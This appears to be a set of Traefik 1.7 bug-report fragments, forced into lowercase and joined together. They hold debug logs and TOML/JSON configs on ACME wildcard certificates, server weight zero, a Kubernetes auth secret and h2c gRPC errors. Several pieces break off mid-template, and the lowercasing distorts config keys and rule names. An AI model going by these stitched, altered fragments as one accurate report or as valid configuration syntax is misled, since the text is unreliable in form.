time="2018-09-07t07:23:12z" level=debug msg="try to challenge certificate for domain [service1.anotherdomain.com] founded in host rule"
time="2018-09-07t07:23:12z" level=debug msg="looking for provided certificate(s) to validate [\\"service1.anotherdomain.com\\"]..."
time="2018-09-07t07:23:12z" level=debug msg="no acme certificate to generate for domains [\\"service1.anotherdomain.com\\"]."
from my own latest 1.7 build (only my added loglines for the cert resolution, removed the redundant array values so you can see what was added)
"acme-provider getalldomains [\\"127.0.0.1\\" \\"172.17.0.1\\" \\"*.domain.com\\" \\"*.test.domain.com\\" \\"*.dev.domain.com\\" \\"*.anotherdomain.com\\"]"
"acme-provider +acme [\\"*.domain.com\\" \\"*.dev.domain.com\\" \\"*.test.domain.com\\"]"
"acme-provider +resolved []"
"acme-provider +configured [\\"*.domain.com\\" \\"*.dev.domain.com\\" \\"*.test.domain.com\\"]"
"acme-provider isdomainalreadychecked service1.anotherdomain.com != 127.0.0.1"
"acme-provider isdomainalreadychecked service1.anotherdomain.com != 172.17.0.1"
"acme-provider isdomainalreadychecked service1.anotherdomain.com != *.domain.com"
"acme-provider isdomainalreadychecked service1.anotherdomain.com != *.test.domain.com"
"acme-provider isdomainalreadychecked service1.anotherdomain.com != *.dev.domain.com"
"acme-provider isdomainalreadychecked service1.anotherdomain.com == *.anotherdomain.com"
### possible solution
only check entrypoints configured for acme against "acme stored or generated" certificates and not against all existing
at least as long as a fallback to that existing "non acme" certificate is not allowed
### if applicable, please paste the log output in debug level (`--loglevel=debug` switch) ```traefik | time="2018-09-04t20:53:54z" level=info msg="using toml configuration file /etc/traefik/traefik.toml"
traefik | time="2018-09-04t20:53:54z" level=info msg="traefik version v1.7.0-rc3 built on 2018-08-01_01:37:51pm"
traefik | time="2018-09-04t20:53:54z" level=info msg="\ stats collection is disabled.\ help us improve traefik by turning this feature on :)\ more details on: #collected-data\ "
traefik | time="2018-09-04t20:53:54z" level=debug msg="global configuration loaded "
traefik | time="2018-09-04t20:53:54z" level=info msg="preparing server http &{address::80 tls:<nil> redirect:<nil> auth:<nil> whitelistsourcerange:[] whitelist:<nil> compress:false proxyprotocol:<nil> forwardedheaders: } with readtimeout=0s writetimeout=0s idletimeout=3m0s"
traefik | time="2018-09-04t20:53:54z" level=info msg="preparing server traefik &{address::8080 tls:<nil> redirect:<nil> auth:<nil> whitelistsourcerange:[] whitelist:<nil> compress:false proxyprotocol:<nil> forwardedheaders: } with readtimeout=0s writetimeout=0s idletimeout=3m0s"
traefik | time="2018-09-04t20:53:54z" level=info msg="starting provider configuration.provideraggregator {}"
traefik | time="2018-09-04t20:53:54z" level=info msg="starting server on :80"
traefik | time="2018-09-04t20:53:54z" level=info msg="starting provider *docker.provider {\\"watch\\":true,\\"filename\\":\\"\\",\\"constraints\\":null,\\"trace\\":false,\\"templateversion\\":2,\\"debugloggeneratedtemplate\\":false,\\"endpoint\\":\\"unix:///var/run/docker.sock\\",\\"domain\\":\\"\\",\\"tls\\":null,\\"exposedbydefault\\":false,\\"usebindportip\\":false,\\"swarmmode\\":false,\\"network\\":\\"\\"}"
traefik | time="2018-09-04t20:53:54z" level=info msg="starting server on :8080"
traefik | time="2018-09-04t20:53:54z" level=debug msg="provider connection established with docker 18.06.1-ce (api 1.38)"
traefik | time="2018-09-04t20:53:54z" level=debug msg="filtering disabled container /traefik"
traefik | time="2018-09-04t20:53:54z" level=debug msg="originlabelsmap[com.docker.compose.oneoff:false com.docker.compose.project:traeffik-test com.docker.compose.service:node_app com.docker.compose.version:1.22.0 traefik.enable:true traefik.frontend.rule:pathprefixstrip: /my-app com.docker.compose.config-hash:3123da025f36cdc16688948e7cde605ff9720ac836206f4142a829a1f8fafd82 com.docker.compose.container-number:1]"
traefik | time="2018-09-04t20:53:54z" level=debug msg="alllabelsmap[:map[traefik.enable:true traefik.frontend.rule:pathprefixstrip: /my-app]]"
traefik | time="2018-09-04t20:53:54z" level=debug msg="originlabelsmap[com.docker.compose.config-hash:3123da025f36cdc16688948e7cde605ff9720ac836206f4142a829a1f8fafd82 com.docker.compose.container-number:1 com.docker.compose.oneoff:false com.docker.compose.project:traeffik-test com.docker.compose.service:node_app com.docker.compose.version:1.22.0 traefik.enable:true traefik.frontend.rule:pathprefixstrip: /my-app]"
traefik | time="2018-09-04t20:53:54z" level=debug msg="alllabelsmap[:map[traefik.enable:true traefik.frontend.rule:pathprefixstrip: /my-app]]"
traefik | time="2018-09-04t20:53:54z" level=debug msg="backend backend-node-app-traeffik-test: no load-balancer defined, fallback to \'wrr\' method"
traefik | time="2018-09-04t20:53:54z" level=debug msg="configuration received from provider docker: {\\"backends\\":{\\"backend-node-app-traeffik-test\\":{\\"servers\\":{\\"server-node-app-8ea854b0da8259f702582994cbce2b9e\\":{\\"url\\":\\" ",\\"weight\\":1}},\\"loadbalancer\\":{\\"method\\":\\"wrr\\"}}},\\"frontends\\":{\\"frontend-pathprefixstrip-my-app-0\\":{\\"entrypoints\\":[\\"http\\"],\\"backend\\":\\"backend-node-app-traeffik-test\\",\\"routes\\":{\\"route-frontend-pathprefixstrip-my-app-0\\":{\\"rule\\":\\"pathprefixstrip: /my-app\\"}},\\"passhostheader\\":true,\\"priority\\":0,\\"basicauth\\":null}}}"
traefik | time="2018-09-04t20:53:54z" level=debug msg="wiring frontend frontend-pathprefixstrip-my-app-0 to entrypoint http"
traefik | time="2018-09-04t20:53:54z" level=debug msg="creating backend backend-node-app-traeffik-test"
traefik | time="2018-09-04t20:53:54z" level=debug msg="creating load-balancer wrr"
traefik | time="2018-09-04t20:53:54z" level=debug msg="creating server server-node-app-8ea854b0da8259f702582994cbce2b9e at with weight 1"
traefik | time="2018-09-04t20:53:54z" level=debug msg="creating route route-frontend-pathprefixstrip-my-app-0 pathprefixstrip: /my-app"
traefik | time="2018-09-04t20:53:54z" level=info msg="server configuration reloaded on :80"
traefik | time="2018-09-04t20:53:54z" level=info msg="server configuration reloaded on :8080"
traefik | time="2018-09-04t20:54:17z" level=debug msg="vulcand/oxy/roundrobin/rr: begin servehttp on request" request="{\\"method\\":\\"get\\",\\"url\\":{\\"scheme\\":\\"\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"\\",\\"path\\":\\"/\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/1.1\\",\\"protomajor\\":1,\\"protominor\\":1,\\"header\\":{\\"accept\\":[\\"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\\"],\\"accept-encoding\\":[\\"gzip, deflate\\"],\\"accept-language\\":[\\"en-us,en;q=0.9,de;q=0.8,es;q=0.7,fr;q=0.6\\"],\\"connection\\":[\\"keep-alive\\"],\\"dnt\\":[\\"1\\"],\\"upgrade-insecure-requests\\":[\\"1\\"],\\"user-agent\\":[\\"mozilla/5.0 (macintosh; intel mac os x 10_13_6) applewebkit/537.36 (khtml, like gecko) chrome/69.0.3497.81 safari/537.36\\"],\\"x-forwarded-prefix\\":[\\"/my-app\\"]},\\"contentlength\\":0,\\"transferencoding\\":null,\\"host\\":\\"0.0.0.0:40080\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"172.21.0.1:34168\\",\\"requesturi\\":\\"/\\",\\"tls\\":null}"
traefik | time="2018-09-04t20:54:17z" level=debug msg="vulcand/oxy/roundrobin/rr: forwarding this request to url" request="{\\"method\\":\\"get\\",\\"url\\":{\\"scheme\\":\\"\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"\\",\\"path\\":\\"/\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/1.1\\",\\"protomajor\\":1,\\"protominor\\":1,\\"header\\":{\\"accept\\":[\\"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\\"],\\"accept-encoding\\":[\\"gzip, deflate\\"],\\"accept-language\\":[\\"en-us,en;q=0.9,de;q=0.8,es;q=0.7,fr;q=0.6\\"],\\"connection\\":[\\"keep-alive\\"],\\"dnt\\":[\\"1\\"],\\"upgrade-insecure-requests\\":[\\"1\\"],\\"user-agent\\":[\\"mozilla/5.0 (macintosh; intel mac os x 10_13_6) applewebkit/537.36 (khtml, like gecko) chrome/69.0.3497.81 safari/537.36\\"],\\"x-forwarded-prefix\\":[\\"/my-app\\"]},\\"contentlength\\":0,\\"transferencoding\\":null,\\"host\\":\\"0.0.0.0:40080\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"172.21.0.1:34168\\",\\"requesturi\\":\\"/\\",\\"tls\\":null}" forwardurl=" "
traefik | time="2018-09-04t20:54:17z" level=debug msg="vulcand/oxy/forward: begin servehttp on request" request="{\\"method\\":\\"get\\",\\"url\\":{\\"scheme\\":\\"http\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"172.21.0.2:9000\\",\\"path\\":\\"\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/1.1\\",\\"protomajor\\":1,\\"protominor\\":1,\\"header\\":{\\"accept\\":[\\"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\\"],\\"accept-encoding\\":[\\"gzip, deflate\\"],\\"accept-language\\":[\\"en-us,en;q=0.9,de;q=0.8,es;q=0.7,fr;q=0.6\\"],\\"connection\\":[\\"keep-alive\\"],\\"dnt\\":[\\"1\\"],\\"upgrade-insecure-requests\\":[\\"1\\"],\\"user-agent\\":[\\"mozilla/5.0 (macintosh; intel mac os x 10_13_6) applewebkit/537.36 (khtml, like gecko) chrome/69.0.3497.81 safari/537.36\\"],\\"x-forwarded-prefix\\":[\\"/my-app\\"]},\\"contentlength\\":0,\\"transferencoding\\":null,\\"host\\":\\"0.0.0.0:40080\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"172.21.0.1:34168\\",\\"requesturi\\":\\"/\\",\\"tls\\":null}"
traefik | time="2018-09-04t20:54:17z" level=debug msg="vulcand/oxy/forward/http: begin servehttp on request" request="{\\"method\\":\\"get\\",\\"url\\":{\\"scheme\\":\\"http\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"172.21.0.2:9000\\",\\"path\\":\\"\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/1.1\\",\\"protomajor\\":1,\\"protominor\\":1,\\"header\\":{\\"accept\\":[\\"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\\"],\\"accept-encoding\\":[\\"gzip, deflate\\"],\\"accept-language\\":[\\"en-us,en;q=0.9,de;q=0.8,es;q=0.7,fr;q=0.6\\"],\\"connection\\":[\\"keep-alive\\"],\\"dnt\\":[\\"1\\"],\\"upgrade-insecure-requests\\":[\\"1\\"],\\"user-agent\\":[\\"mozilla/5.0 (macintosh; intel mac os x 10_13_6) applewebkit/537.36 (khtml, like gecko) chrome/69.0.3497.81 safari/537.36\\"],\\"x-forwarded-prefix\\":[\\"/my-app\\"]},\\"contentlength\\":0,\\"transferencoding\\":null,\\"host\\":\\"0.0.0.0:40080\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"172.21.0.1:34168\\",\\"requesturi\\":\\"/\\",\\"tls\\":null}"
traefik | time="2018-09-04t20:54:17z" level=debug msg="upstream responsewriter of type *pipelining.writerwithoutclosenotify does not implement http.closenotifier
returning dummy channel."
node_app | get /
traefik | time="2018-09-04t20:54:17z" level=debug msg="vulcand/oxy/forward/http: round trip: code: 200, length: 98, duration: 98.1766ms"
traefik | time="2018-09-04t20:54:17z" level=debug msg="vulcand/oxy/forward/http: completed servehttp on request" request="{\\"method\\":\\"get\\",\\"url\\":{\\"scheme\\":\\"http\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"172.21.0.2:9000\\",\\"path\\":\\"\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/1.1\\",\\"protomajor\\":1,\\"protominor\\":1,\\"header\\":{\\"accept\\":[\\"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\\"],\\"accept-encoding\\":[\\"gzip, deflate\\"],\\"accept-language\\":[\\"en-us,en;q=0.9,de;q=0.8,es;q=0.7,fr;q=0.6\\"],\\"connection\\":[\\"keep-alive\\"],\\"dnt\\":[\\"1\\"],\\"upgrade-insecure-requests\\":[\\"1\\"],\\"user-agent\\":[\\"mozilla/5.0 (macintosh; intel mac os x 10_13_6) applewebkit/537.36 (khtml, like gecko) chrome/69.0.3497.81 safari/537.36\\"],\\"x-forwarded-prefix\\":[\\"/my-app\\"]},\\"contentlength\\":0,\\"transferencoding\\":null,\\"host\\":\\"0.0.0.0:40080\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"172.21.0.1:34168\\",\\"requesturi\\":\\"/\\",\\"tls\\":null}"
traefik | time="2018-09-04t20:54:17z" level=debug msg="vulcand/oxy/forward: completed servehttp on request" request="{\\"method\\":\\"get\\",\\"url\\":{\\"scheme\\":\\"http\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"172.21.0.2:9000\\",\\"path\\":\\"\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/1.1\\",\\"protomajor\\":1,\\"protominor\\":1,\\"header\\":{\\"accept\\":[\\"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\\"],\\"accept-encoding\\":[\\"gzip, deflate\\"],\\"accept-language\\":[\\"en-us,en;q=0.9,de;q=0.8,es;q=0.7,fr;q=0.6\\"],\\"connection\\":[\\"keep-alive\\"],\\"dnt\\":[\\"1\\"],\\"upgrade-insecure-requests\\":[\\"1\\"],\\"user-agent\\":[\\"mozilla/5.0 (macintosh; intel mac os x 10_13_6) applewebkit/537.36 (khtml, like gecko) chrome/69.0.3497.81 safari/537.36\\"],\\"x-forwarded-prefix\\":[\\"/my-app\\"]},\\"contentlength\\":0,\\"transferencoding\\":null,\\"host\\":\\"0.0.0.0:40080\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"172.21.0.1:34168\\",\\"requesturi\\":\\"/\\",\\"tls\\":null}"
traefik | time="2018-09-04t20:54:17z" level=debug msg="vulcand/oxy/roundrobin/rr: completed servehttp on request" request="{\\"method\\":\\"get\\",\\"url\\":{\\"scheme\\":\\"\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"\\",\\"path\\":\\"/\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/1.1\\",\\"protomajor\\":1,\\"protominor\\":1,\\"header\\":{\\"accept\\":[\\"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\\"],\\"accept-encoding\\":[\\"gzip, deflate\\"],\\"accept-language\\":[\\"en-us,en;q=0.9,de;q=0.8,es;q=0.7,fr;q=0.6\\"],\\"connection\\":[\\"keep-alive\\"],\\"dnt\\":[\\"1\\"],\\"upgrade-insecure-requests\\":[\\"1\\"],\\"user-agent\\":[\\"mozilla/5.0 (macintosh; intel mac os x 10_13_6) applewebkit/537.36 (khtml, like gecko) chrome/69.0.3497.81 safari/537.36\\"],\\"x-forwarded-prefix\\":[\\"/my-app\\"]},\\"contentlength\\":0,\\"transferencoding\\":null,\\"host\\":\\"0.0.0.0:40080\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"172.21.0.1:34168\\",\\"requesturi\\":\\"/\\",\\"tls\\":null}"```
{ "lifecycle": { "requestacceptgracetimeout": 0, "gracetimeout": 0 }, "gracetimeout": 0, "debug": false, "checknewversion": true, "sendanonymoususage": false, "accesslogsfile": "", "accesslog": null, "traefiklogsfile": "", "traefiklog": null, "tracing": null, "loglevel": "", "entrypoints": { "http": { "address": "xxxx", "tls": null, "redirect": null, "auth": null, "whitelistsourcerange": null, "whitelist": null, "compress": false, "proxyprotocol": null, "forwardedheaders": null }, "https": { "address": "xxxx", "tls": { "minversion": "", "ciphersuites": null, "certificates": null, "clientcafiles": null, "clientca": { "files": null, "optional": false } }, "redirect": null, "auth": null, "whitelistsourcerange": null, "whitelist": null, "compress": false, "proxyprotocol": null, "forwardedheaders": null } }, "cluster": null, "constraints": [], "acme": null, "defaultentrypoints": [ "http", "https" ], "providersthrottleduration": 2000000000, "maxidleconnsperhost": 200, "idletimeout": 0, "insecureskipverify": false, "rootcas": null, "retry": null, "healthcheck": { "interval": 30000000000 }, "respondingtimeouts": null, "forwardingtimeouts": null, "allowminweightzero": true, "web": null, "docker": null, "file": null, "marathon": null, "consul": { "watch": true, "filename": "", "constraints": [], "trace": false, "templateversion": 0, "debugloggeneratedtemplate": false, "endpoint": "xxxx", "prefix": "traefik", "tls": null, "username": "", "password": "" }, "consulcatalog": null, "etcd": null, "zookeeper": null, "boltdb": null, "kubernetes": null, "mesos": null, "eureka": null, "ecs": null, "rancher": null, "dynamodb": null, "servicefabric": null, "rest": null, "api": { "entrypoint": "traefik", "dashboard": true, "debug": false, "currentconfigurations": null, "statistics": null }, "metrics": null, "ping": { "entrypoint": "traefik" }, "configfile": "/etc/traefik.toml"
``` ```toml
# allow the use of 0 as server weight.
# - false: a weight 0 means internally a weight of 1.
# - true: a weight 0 means internally a weight of 0 (a server with a weight of 0 is removed from the available servers).
# default: false
allowminweightzero = true ############################################################
# frontends configuration
############################################################
[frontends] [frontends.paira] backend = "paira" passhostheader = true [frontends.paira.routes.hostmatch] rule = "host:paira.local" [frontends.pairb] backend = "pairb" passhostheader = true [frontends.pairb.routes.hostmatch] rule = "host:pairb.local" ############################################################
# backends configuration
############################################################
[backends] [backends.paira] [backends.paira.servers.server1] url = " " weight = 1 [backends.paira.servers.server2] url = " " weight = 0 [backends.pairb] [backends.pairb.healthcheck] path = "/" [backends.pairb.servers.server1] url = " " weight = 1 [backends.pairb.servers.server2] url = " " weight = 0
[config.txt]( ### if applicable, please paste the log output at debug level (`--loglevel=debug` switch)
loglevel = "info"
defaultentrypoints = [ "https" ] [traefiklog] filepath = "/var/log/traefik/traefik.log" [accesslog] filepath = "/var/log/traefik/access.log" format = "json" [accesslog.fields] defaultmode = "drop" [accesslog.fields.names] "requesthost" = "keep" "clienthost" = "keep" "requestline" = "keep" "frontendname" = "keep" "backendaddr" = "keep" "requestprotocol" = "keep" [accesslog.fields.headers] defaultmode = "drop" [accesslog.fields.headers.names] "user-agent" = "keep" [entrypoints] #[entrypoints.http] #address = ":80" #[entrypoints.http.redirect] # entrypoint = "https" [entrypoints.https] address = ":443" [entrypoints.https.tls] [entrypoints.traefik] address = ":9955" [acme]
email = "acme@site.ro"
# storagefile = "/etc/traefik/acme.json"
storage = "traefikstatic/acme/account"
caserver = " "
entrypoint = "https"
acmelogging = true
onhostrule = true
# ondemand = true [acme.tlschallenge]
#[acme.httpchallenge]
#entrypoint = "http" [consul]
endpoint = "127.0.0.1:8500"
watch = true
prefix = "traefikstatic"
``` ### if applicable, please paste the log output in debug level (`--loglevel=debug` switch) ```
time="2018-08-28t15:31:42+03:00" level=debug msg="loadcertificatefordomains [static.site.ro]..."
time="2018-08-28t15:31:42+03:00" level=debug msg="looking for provided certificate to validate [static.site.ro]..."
time="2018-08-28t15:31:42+03:00" level=debug msg="domains [\\"static.site.ro\\"] need acme certificates generation for domains \\"static.site.ro\\"."
time="2018-08-28t15:31:42+03:00" level=debug msg="loading acme certificates [static.site.ro]..."
time="2018-08-28t15:31:42+03:00" level=info msg="legolog: [info] [static.site.ro] acme: obtaining bundled san certificate"
time="2018-08-28t15:31:43+03:00" level=info msg="legolog: [info] [static.site.ro] authurl: "
time="2018-08-28t15:31:43+03:00" level=info msg="legolog: [info] [static.site.ro] acme: trying to solve tls-alpn-01"
time="2018-08-28t15:31:43+03:00" level=debug msg="challenge present static.site.ro"
time="2018-08-28t15:31:44+03:00" level=error msg="error in go routine: runtime error: invalid memory address or nil pointer dereference"
```toml ``` ### if applicable, please paste the log output in debug level (`--loglevel=debug` switch) ```
time="2018-08-21t13:40:40+02:00" level=error msg="failed to retrieve auth configuration for ingress kube-system/caldera: failed to load auth secret: secret \\"kube-system\\"/\\"tls-auth\\" does not exist"
time="2018-08-21t13:40:40+02:00" level=debug msg="configuration received from provider kubernetes: {\\"backends\\":{\\"/clusters/caldera/\\":{\\"loadbalancer\\":{\\"method\\":\\"wrr\\"}}}}"
time="2018-08-21t13:40:40+02:00" level=debug msg="received kubernetes event kind *v1.secret"
time="2018-08-21t13:40:40+02:00" level=error msg="near line 51 (last key parsed \'frontends.clusters/caldera/.auth.forward.tls.cert\'): strings cannot contain newlines"
debug = false loglevel = "error"
defaultentrypoints = ["https","http"] [entrypoints] [entrypoints.http] address = ":80" [entrypoints.http.redirect] entrypoint = "https" [entrypoints.https] address = ":443" [entrypoints.https.tls] [[entrypoints.https.tls.certificates]] certfile = "/run/secrets/wildcard.domain.tld.cert" keyfile = "/run/secrets/wildcard.domain.tld.key" [entrypoints.api] address = ":8080" [retry] [docker]
endpoint = "unix:///var/run/docker.sock"
domain = "domain.tld"
watch = true
swarmmode = true
exposedbydefault = false [acme]
email = "root@domain.tld"
storage = "acme.json"
onhostrule = true
caserver = " "
entrypoint = "https" [acme.httpchallenge] entrypoint = "http" [api]
entrypoint = "api"
dashboard = true
defaultentrypoints = ["http"]
debug=true [entrypoints] [entrypoints.http] address = ":50052" [api] [file] [backends] [backends.backend1] [backends.backend1.servers.server1] # access on backend with h2c url = "h2c://host.docker.internal:50051" [frontends] [frontends.frontend1] backend = "backend1"
``` ### if applicable, please paste the log output in debug level (`--loglevel=debug` switch) ```
time="2018-08-19t06:17:14z" level=info msg="using toml configuration file /etc/traefik/traefik.toml"
time="2018-08-19t06:17:14z" level=info msg="traefik version v1.7.0-rc3 built on 2018-08-01_01:37:51pm"
time="2018-08-19t06:17:14z" level=info msg="\ stats collection is disabled.\ help us improve traefik by turning this feature on :)\ more details on: #collected-data\ "
time="2018-08-19t06:17:14z" level=debug msg="global configuration loaded "
time="2018-08-19t06:17:14z" level=info msg="preparing server http &{address::50052 tls:<nil> redirect:<nil> auth:<nil> whitelistsourcerange:[] whitelist:<nil> compress:false proxyprotocol:<nil> forwardedheaders: } with readtimeout=0s writetimeout=0s idletimeout=3m0s"
time="2018-08-19t06:17:14z" level=info msg="preparing server traefik &{address::8080 tls:<nil> redirect:<nil> auth:<nil> whitelistsourcerange:[] whitelist:<nil> compress:false proxyprotocol:<nil> forwardedheaders: } with readtimeout=0s writetimeout=0s idletimeout=3m0s"
time="2018-08-19t06:17:14z" level=info msg="starting provider configuration.provideraggregator {}"
time="2018-08-19t06:17:14z" level=info msg="starting server on :50052"
time="2018-08-19t06:17:14z" level=info msg="starting server on :8080"
time="2018-08-19t06:17:14z" level=info msg="starting provider *file.provider {\\"watch\\":true,\\"filename\\":\\"\\",\\"constraints\\":null,\\"trace\\":false,\\"templateversion\\":0,\\"debugloggeneratedtemplate\\":false,\\"directory\\":\\"\\",\\"traefikfile\\":\\"/etc/traefik/traefik.toml\\"}"
time="2018-08-19t06:17:14z" level=debug msg="backend backend1: no load-balancer defined, fallback to \'wrr\' method"
time="2018-08-19t06:17:14z" level=debug msg="configuration received from provider file: {\\"backends\\":{\\"backend1\\":{\\"servers\\":{\\"server1\\":{\\"url\\":\\"h2c://host.docker.internal:50051\\",\\"weight\\":0}},\\"loadbalancer\\":{\\"method\\":\\"wrr\\"}}},\\"frontends\\":{\\"frontend1\\":{\\"entrypoints\\":[\\"http\\"],\\"backend\\":\\"backend1\\",\\"priority\\":0,\\"basicauth\\":null}}}"
time="2018-08-19t06:17:14z" level=debug msg="wiring frontend frontend1 to entrypoint http"
time="2018-08-19t06:17:14z" level=debug msg="creating backend backend1"
time="2018-08-19t06:17:14z" level=debug msg="creating load-balancer wrr"
time="2018-08-19t06:17:14z" level=debug msg="creating server server1 at h2c://host.docker.internal:50051 with weight 0"
time="2018-08-19t06:17:14z" level=info msg="server configuration reloaded on :50052"
time="2018-08-19t06:17:14z" level=info msg="server configuration reloaded on :8080"
time="2018-08-19t06:17:28z" level=debug msg="vulcand/oxy/roundrobin/rr: begin servehttp on request" request="{\\"method\\":\\"post\\",\\"url\\":{\\"scheme\\":\\"\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"\\",\\"path\\":\\"/greeter/sayhello\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/2.0\\",\\"protomajor\\":2,\\"protominor\\":0,\\"header\\":{\\"accept-encoding\\":[\\"identity,gzip\\"],\\"content-type\\":[\\"application/grpc\\"],\\"grpc-accept-encoding\\":[\\"identity,deflate,gzip\\"],\\"te\\":[\\"trailers\\"],\\"user-agent\\":[\\"grpc-python/1.12.1 grpc-c/6.0.0 (osx; chttp2; glorious)\\"]},\\"contentlength\\":-1,\\"transferencoding\\":null,\\"host\\":\\"localhost:50052\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"172.17.0.1:39690\\",\\"requesturi\\":\\"/greeter/sayhello\\",\\"tls\\":null}"
time="2018-08-19t06:17:28z" level=debug msg="vulcand/oxy/roundrobin/rr: forwarding this request to url" request="{\\"method\\":\\"post\\",\\"url\\":{\\"scheme\\":\\"\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"\\",\\"path\\":\\"/greeter/sayhello\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/2.0\\",\\"protomajor\\":2,\\"protominor\\":0,\\"header\\":{\\"accept-encoding\\":[\\"identity,gzip\\"],\\"content-type\\":[\\"application/grpc\\"],\\"grpc-accept-encoding\\":[\\"identity,deflate,gzip\\"],\\"te\\":[\\"trailers\\"],\\"user-agent\\":[\\"grpc-python/1.12.1 grpc-c/6.0.0 (osx; chttp2; glorious)\\"]},\\"contentlength\\":-1,\\"transferencoding\\":null,\\"host\\":\\"localhost:50052\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"172.17.0.1:39690\\",\\"requesturi\\":\\"/greeter/sayhello\\",\\"tls\\":null}" forwardurl="h2c://host.docker.internal:50051"
time="2018-08-19t06:17:28z" level=debug msg="vulcand/oxy/forward: begin servehttp on request" request="{\\"method\\":\\"post\\",\\"url\\":{\\"scheme\\":\\"h2c\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"host.docker.internal:50051\\",\\"path\\":\\"\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/2.0\\",\\"protomajor\\":2,\\"protominor\\":0,\\"header\\":{\\"accept-encoding\\":[\\"identity,gzip\\"],\\"content-type\\":[\\"application/grpc\\"],\\"grpc-accept-encoding\\":[\\"identity,deflate,gzip\\"],\\"te\\":[\\"trailers\\"],\\"user-agent\\":[\\"grpc-python/1.12.1 grpc-c/6.0.0 (osx; chttp2; glorious)\\"]},\\"contentlength\\":-1,\\"transferencoding\\":null,\\"host\\":\\"localhost:50052\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"172.17.0.1:39690\\",\\"requesturi\\":\\"/greeter/sayhello\\",\\"tls\\":null}"
time="2018-08-19t06:17:28z" level=debug msg="vulcand/oxy/forward/http: begin servehttp on request" request="{\\"method\\":\\"post\\",\\"url\\":{\\"scheme\\":\\"h2c\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"host.docker.internal:50051\\",\\"path\\":\\"\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/2.0\\",\\"protomajor\\":2,\\"protominor\\":0,\\"header\\":{\\"accept-encoding\\":[\\"identity,gzip\\"],\\"content-type\\":[\\"application/grpc\\"],\\"grpc-accept-encoding\\":[\\"identity,deflate,gzip\\"],\\"te\\":[\\"trailers\\"],\\"user-agent\\":[\\"grpc-python/1.12.1 grpc-c/6.0.0 (osx; chttp2; glorious)\\"]},\\"contentlength\\":-1,\\"transferencoding\\":null,\\"host\\":\\"localhost:50052\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"172.17.0.1:39690\\",\\"requesturi\\":\\"/greeter/sayhello\\",\\"tls\\":null}"
time="2018-08-19t06:17:28z" level=debug msg="\'500 internal server error\' caused by: stream error: stream id 3; internal_error"
time="2018-08-19t06:17:28z" level=debug msg="vulcand/oxy/forward/http: round trip: h2c://host.docker.internal:50051, code: 500, length: 21, duration: 2.899866ms"
